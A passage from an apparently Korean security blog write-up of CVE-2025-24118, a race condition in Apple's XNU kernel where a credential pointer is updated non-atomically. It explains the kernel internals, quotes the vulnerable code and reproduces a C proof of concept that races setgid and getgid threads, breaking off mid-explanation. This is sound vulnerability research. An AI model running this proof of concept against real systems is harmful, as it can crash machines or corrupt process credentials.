&#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;. </p><blockquote><p><strong>Safe Memory Reclamation in XNU(<a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.41.3/osfmk/kern/smr.c#L47">&#xB9C1;&#xD06C;</a>)</strong><br>RCU(Read-Copy-Update &#xBC29;&#xC2DD;)&#xACFC; &#xB9E4;&#xC6B0; &#xBE44;&#xC2B7;&#xD558;&#xAC8C;, XNU&#xC758; SMR &#xAD6C;&#xD604;&#xC740; read-side critical section&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, <code>reader</code>&#xB294; SMR &#xBCF4;&#xD638; &#xD544;&#xB4DC;&#xB97C; &#xC77D;&#xAE30; &#xC804; <code>smr_enter()</code>&#xC744; &#xD638;&#xCD9C;&#xD574;&#xC57C; &#xD558;&#xACE0;, &#xC77D;&#xC740; &#xD6C4; <code>smr_leave()</code>&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.<br><code>writer</code>&#xC740; &#xC791;&#xC131;&#xC790;&#xB97C; &#xC9C1;&#xB82C;&#xD654; &#xD568;&#xC73C;&#xB85C;&#xC368; &#xD55C; &#xBC88;&#xC5D0; &#xD558;&#xB098;&#xC758; &#xC791;&#xC131;&#xC790;&#xB9CC; &#xC788;&#xC744; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. <code>writer</code>&#xC740; atomic &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC758; &#xC0C8; &#xBC84;&#xC804;&#xC744; &#xAC8C;&#xC2DC;&#xD558;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C; atomic CPU &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xAC83;&#xC774; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <code>reader</code>&#xAC00; SMR &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC911;&#xAC04; &#xAC12;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><p>2) <strong>Read-Only Pages in XNU</strong></p><p>XNU&#xB294; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; API&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;(<a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.41.3/doc/allocators/read-only.md">&#xB9C1;&#xD06C;</a>). </p><p>&#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xAC1D;&#xCCB4;&#xB294; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xB9E4;&#xD551;&#xC744; &#xC704;&#xD574; &#xC124;&#xACC4;&#xB41C; &#xD2B9;&#xC218; &#xBC84;&#xC804;&#xC758; allocator&#xC778; <code>zalloc_ro</code>&#xC744; &#xD1B5;&#xD574; &#xD560;&#xB2F9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>zalloc_ro_mut</code> &#xACFC; &#xC774;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xBA54;&#xC18C;&#xB4DC;&#xB85C;&#xB9CC; &#xC77D;&#xAE30; &#xC804;&#xC6A9;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC218;&#xC815;&#xD560; &#xAC1D;&#xCCB4;&#xC640; &#xC4F8; &#xB0B4;&#xC6A9;&#xC744; &#xC778;&#xC218;&#xB85C; &#xBC1B;&#xB294;&#xB370;. &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xAC1D;&#xCCB4;&#xC6A9; memcpy&#xC758; &#xD2B9;&#xC218; &#xBC84;&#xC804;&#xACFC; &#xBE44;&#xC2B7;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; <code>zalloc_ro_mut</code>&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>pmap_ro_zone_memcpy</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xC5D0; &#xB530;&#xB77C; &#xD398;&#xC774;&#xC9C0; &#xBCF4;&#xD638; &#xACC4;&#xCE35;(PPL)&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xC5EC; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC7A0;&#xAE08; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>x84_64&#xC5D0;&#xC11C; <code>memcpy</code>&#xC758; &#xAD6C;&#xD604;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;,</p><pre><code class="hljs nasm">ENTRY(memcpy)  movq    %rdi, %rax  /* return destination */  movq    %rdx, %rcx  cld                 /* copy forwards */  rep movsb  ret</code></pre><p><code>rep movsb</code>&#xB85C; &#xC778;&#xD574; atomic&#xC774;&#xC9C0; &#xC54A;&#xACE0; &#xBC14;&#xC774;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D;, &#xB3D9;&#xC2DC;&#xC5D0; <code>reader</code>&#xAC00; &#xBD80;&#xBD84;&#xC801;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAD00;&#xCC30;&#xD558;&#xBA74; <code>writer</code> &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xC791;&#xC131;&#xC911;&#xC778; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC774;&#xC804; &#xAC12;&#xACFC; &#xC0C8; &#xAC12;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xC5F0;&#xACB0;&#xD558;&#xC5EC; &#xD615;&#xC131;&#xB41C; &#xC798;&#xBABB;&#xB41C; &#xC8FC;&#xC18C;&#xB85C; &#xC5ED;&#xCC38;&#xC870;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; <code>writer</code>&#xB3C4; &#xCC38;&#xC870;&#xD558;&#xC9C0; &#xC54A;&#xC740; 3&#xBC88;&#xC9F8; &#xC720;&#xD6A8;&#xD55C; &#xAC1D;&#xCCB4;&#xB97C; &#xC815;&#xD655;&#xD788; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xAC1D;&#xCCB4;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD560; &#xB54C; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;&#xB97C; &#xB2E4;&#xC2DC; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC21C;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><code>zalloc_ro_mut</code> &#x2192; <code>pmap_ro_zone_memcpy</code> &#x2192; <code>memcpy</code> &#x2192; <code>rep movsb</code></p></blockquote><p>&#xACB0;&#xAD6D; <code>zalloc_ro_mut</code>&#xAC00; <code>rep movsp</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD568;&#xC740; &#xC790;&#xBA85;&#xD558;&#xC9C0;&#xB9CC; atomic &#xC4F0;&#xAE30;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xACF3;&#xC5D0; atomic &#xC4F0;&#xAE30;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xB9CC;&#xC57D;, <code>zalloc_ro_mut</code>&#xAC00; <code>zalloc_ro_mut_atomic</code>&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4;&#xC57C; &#xD560; &#xACF3;&#xC5D0; &#xC788;&#xB2E4;&#xBA74; race condition &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>3) <strong>Per-Thread Credentials</strong></p><p>XNU&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC740; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xC0AC;&#xC6A9;&#xC790; ID&#xC640; &#xAC19;&#xC740; &#xC5EC;&#xB7EC; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xD544;&#xB4DC;&#xB97C; &#xD2B8;&#xB808;&#xC774;&#xC2F1;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; <code>ucred</code>&#xC758; &#xC815;&#xC758;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucred</span> {</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucred_rw</span>        *<span class="hljs-title">cr_rw</span>;</span>  <span class="hljs-keyword">void</span>                   *cr_unused;  u_long                  cr_ref;  <span class="hljs-comment">/* reference count */</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">posix_cred</span> {</span>    <span class="hljs-comment">/*</span><span class="hljs-comment">     * The credential hash depends on everything from this point on</span><span class="hljs-comment">     * (see kauth_cred_get_hashkey)</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">uid_t</span>   cr_uid;         <span class="hljs-comment">/* effective user id */</span>    <span class="hljs-keyword">uid_t</span>   cr_ruid;        <span class="hljs-comment">/* real user id */</span>    <span class="hljs-keyword">uid_t</span>   cr_svuid;       <span class="hljs-comment">/* saved user id */</span>    u_short cr_ngroups;     <span class="hljs-comment">/* number of groups in advisory list */</span>    u_short __cr_padding;    <span class="hljs-keyword">gid_t</span>   cr_groups[NGROUPS];<span class="hljs-comment">/* advisory group list */</span>    <span class="hljs-keyword">gid_t</span>   cr_rgid;        <span class="hljs-comment">/* real group id */</span>    <span class="hljs-keyword">gid_t</span>   cr_svgid;       <span class="hljs-comment">/* saved group id */</span>    <span class="hljs-keyword">uid_t</span>   cr_gmuid;       <span class="hljs-comment">/* UID for group membership purposes */</span>    <span class="hljs-keyword">int</span>     cr_flags;       <span class="hljs-comment">/* flags on credential */</span>  } cr_posix;...};</code></pre><p>&#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC758; &#xC77C;&#xBD80; <code>posix_cred</code>&#xB294; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xCD94;&#xC801;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xB300;&#xBD80;&#xBD84; &#xC2A4;&#xB808;&#xB4DC;&#xB294; &#xD604;&#xC7AC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xACFC; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xB3D9;&#xC77C;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xB7EC;&#xD55C; &#xB3D9;&#xC77C; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC758; &#xC0AC;&#xBCF8;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB824;&#xBA74; &#xC0C1;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; XNU&#xB294; SMR &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAD6C;&#xC870;&#xB97C; &#xD574;&#xC2F1;&#xD558;&#xC5EC; &#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xB3D9;&#xC77C;&#xD55C; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAC1D;&#xCCB4;&#xB97C; &#xACF5;&#xC720;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAC1D;&#xCCB4;&#xB294; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;(<code>cr_ref</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xC810;&#xC744; &#xCD94;&#xC801;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xC2DC;&#xB294; <code>cred</code>&#xC758; &#xB450;&#xBC88;&#xC9F8; &#xC808;&#xBC18;(e.g., cr_posix &#xC774;&#xD6C4;)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB3D9;&#xC77C;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xB3D9;&#xC77C;&#xD55C; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAC1D;&#xCCB4;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h3><p>&#xC55E;&#xC11C; &#xB9D0;&#xC500;&#xB4DC;&#xB9B0; root cause&#xB97C; &#xC694;&#xC57D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>proc_ro</code>&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;(&#xC790;&#xACA9; &#xC99D;&#xBA85; &#xB4F1;)&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xAC1D;&#xCCB4;&#xC774;&#xBA70;, <code>zalloc_ro_mut</code> &#xD568;&#xC218; &#xACC4;&#xC5F4;&#xC744; &#xD1B5;&#xD574;&#xC11C;&#xB9CC; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>proc_ro.p_ucred</code> &#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; SMR&#xB85C; &#xBCF4;&#xD638;&#xB41C; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>p_ucred</code>&#xB294; SMR &#xD3EC;&#xC778;&#xD130; &#xC774;&#xBBC0;&#xB85C; <code>writer</code>&#xB294; <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.41.3/bsd/sys/proc_internal.h#L309">lock</a>&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC11C;&#xB85C; &#xB3D9;&#xAE30;&#xD654;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xC0AC;&#xC6A9; &#xC2DC; atomic &#xC791;&#xC5C5;&#xC744; &#xD1B5;&#xD574;&#xC11C; <code>p_ucred</code>&#xB97C; &#xBCC0;&#xACBD;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xAC1D;&#xCCB4;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; <code>zalloc_ro_mut</code> &#xD568;&#xC218;&#xB294; atomic &#xD558;&#xC9C0; &#xC54A;&#xC544; <code>u_cred</code>&#xB97C; &#xC218;&#xC815;&#xD558;&#xAE30;&#xC5D0; &#xC801;&#xD569;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xADF8;&#xB798;&#xC11C; &#xBC84;&#xADF8;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; <code>pro_ro.p_ucred</code>&#xB97C; atomic &#xD558;&#xC9C0; &#xC54A;&#xC740; &#xD568;&#xC218; <code>zalloc_ro_mut</code>&#xB97C; &#xD1B5;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xC9C0;&#xC810;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC2DC; &#xC7A0;&#xAE08; &#xC5C6;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xB294; <code>p_ucred</code>&#xC758; SMR &#xC5ED;&#xCC38;&#xC870;&#xC640; race condition&#xC744; &#xC77C;&#xC73C;&#xCF1C; &#xBD80;&#xBD84;&#xC801;&#xC73C;&#xB85C; <code>p_ucred</code>&#xC5D0; &#xAC12;&#xC744; &#xC368; <strong>&#xB2E4;&#xB978; &#xC790;&#xACA9; &#xC99D;&#xBA85;</strong>&#xC744; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xBC84;&#xADF8;-&#xD568;&#xC218;"><a href="#&#xBC84;&#xADF8;-&#xD568;&#xC218;" class="headerlink" title="&#xBC84;&#xADF8; &#xD568;&#xC218;"></a>&#xBC84;&#xADF8; &#xD568;&#xC218;</h3><p>&#xBC84;&#xADF8;&#xB294; <code>kauth_cred_proc_update</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>proc_ro</code>&#xC758; <code>p_ucred</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC2DC;&#xD0A4;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs haxe">boolkauth_cred_proc_update(  proc_t                  p,  proc_settoken_t         action,  kauth_cred_derive_t     derive_fn){  kauth_cred_t cur_cred, free_cred, <span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>;  cur_cred = kauth_cred_proc_ref(p);  <span class="hljs-keyword">for</span> (;;) {    <span class="hljs-keyword">new</span><span class="hljs-type">_cred</span> = kauth_cred_derive(cur_cred, derive_fn);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span><span class="hljs-type">_cred</span> == cur_cred) {      ...      kauth_cred_unref(&amp;<span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>);      kauth_cred_unref(&amp;cur_cred);      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }    proc_ucred_lock(p);    <span class="hljs-keyword">if</span> (__probable(proc_ucred_locked(p) == cur_cred)) {      kauth_cred_ref(<span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>);      kauth_cred_hold(<span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>);      <span class="hljs-comment">// This is the bug:</span>      zalloc_ro_mut(ZONE_ID_PROC_RO, proc_get_ro(p),          offsetof(struct proc_ro, p_ucred),          &amp;<span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>, sizeof(struct ucred *));      kauth_cred_drop(cur_cred);      ucred_rw_unref_live(cur_cred-&gt;cr_rw);      proc_update_creds_onproc(p, <span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>);      proc_ucred_unlock(p);      ...      kauth_cred_unref(&amp;<span class="hljs-keyword">new</span><span class="hljs-type">_cred</span>);      kauth_cred_unref(&amp;cur_cred);      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    }    ...  }}</code></pre><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><code>kauth_cred_proc_update</code>&#xAC00; <code>p_ucred</code>&#xB97C; &#xBCC0;&#xACBD;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0;&#xB9CC;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC791;&#xC5C5; &#xD750;&#xB984;&#xC5D0;&#xC11C;&#xB294; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. Race condition&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <code>p_ucred</code>&#xC5D0; &#xC4F0;&#xAE30;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB3D9;&#xC548; &#xC77D;&#xC5B4;&#xC640;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC2DC; &#xB9D0;&#xD574; <code>zalloc_ro_mut</code>&#xB97C; &#xD1B5;&#xD574;&#xC11C; <code>p_ucred</code>&#xAC00; &#xBCC0;&#xACBD;&#xB420; &#xB54C;&#xC758; &#xC9C0;&#xC810;&#xC744; &#xC7A1;&#xC544;&#xC57C; &#xD558;&#xACE0; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD750;&#xB984;&#xC740; <code>setuid</code>, <code>setgid</code>, <code>setgroups</code>&#xB4F1;&#xC774; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; PoC&#xB294; setgid&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; race condition&#xC744; &#xC99D;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// Joseph Ravichandran (@0xjprx)</span><span class="hljs-comment">// PoC for CVE-2025-24118.</span><span class="hljs-comment">// Writeup: https://jprx.io/cve-2025-24118</span>...<span class="hljs-keyword">gid_t</span> rg; <span class="hljs-comment">// real gid</span><span class="hljs-keyword">gid_t</span> eg; <span class="hljs-comment">// effective gid</span><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">toggle_cred</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *_unused_)</span> </span>{    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {        <span class="hljs-comment">// [1]</span>        setgid(rg);        setgid(eg);    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;}<span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">reference_cred</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *_unused_)</span> </span>{    <span class="hljs-comment">// [2]</span>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">gid_t</span> tmp;    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) tmp = getgid();        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>{    <span class="hljs-keyword">pthread_t</span> pool[<span class="hljs-number">2</span> * NUM_THREADS];    rg = getgid();    eg = getegid();    <span class="hljs-keyword">if</span> (rg == eg) {        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Real and effective groups are the same (%d), they need to be different to trigger kauth_cred_proc_update\n&quot;</span>, rg);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Starting %d thread pairs\n&quot;</span>, NUM_THREADS);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;rgid: %d\negid: %d\n&quot;</span>, rg, eg);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_THREADS; i++) {        pthread_create(&amp;pool[(<span class="hljs-number">2</span>*i)+<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, toggle_cred, <span class="hljs-literal">NULL</span>);        pthread_create(&amp;pool[(<span class="hljs-number">2</span>*i)+<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, reference_cred, <span class="hljs-literal">NULL</span>);    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_THREADS; i++) {        pthread_join(pool[(<span class="hljs-number">2</span>*i)+<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);        pthread_join(pool[(<span class="hljs-number">2</span>*i)+<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Done\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><a href="Writer Thread"> 1 </a> <code>proc_ro.p_ucred</code>&#xC5D0; &#xAC12;&#xC744; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; <code>kauth_cred_proc_update</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><code>setgid</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; <code>kauth_cred_proc_update</code>&#xB294; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; <code>p_ucred</code>&#xB85C;  &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD569;&#xB2C8;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; real gid&#xB85C; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p><a href="Reader Thread"> 2 </a> <code>proc_ro.p_ucred</code>&#xB97C; &#xC77D;&#xAE30; &#xC704;&#xD574; <code>current_cached_proc_cred_update</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>unix_syscall64 &#xC2A4;&#xB808;&#xB4DC; &#xAC04;&#xC5D0; &#xB2E4;&#xB978; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBAA8;&#xB4E0; syscall &#xB3D9;&#xC548; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB8F9; ID &#xBCC0;&#xACBD;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBAA8;&#xB4E0; syscall&#xC740; &#xC774; &#xC77D;&#xAE30;&#xB97C; 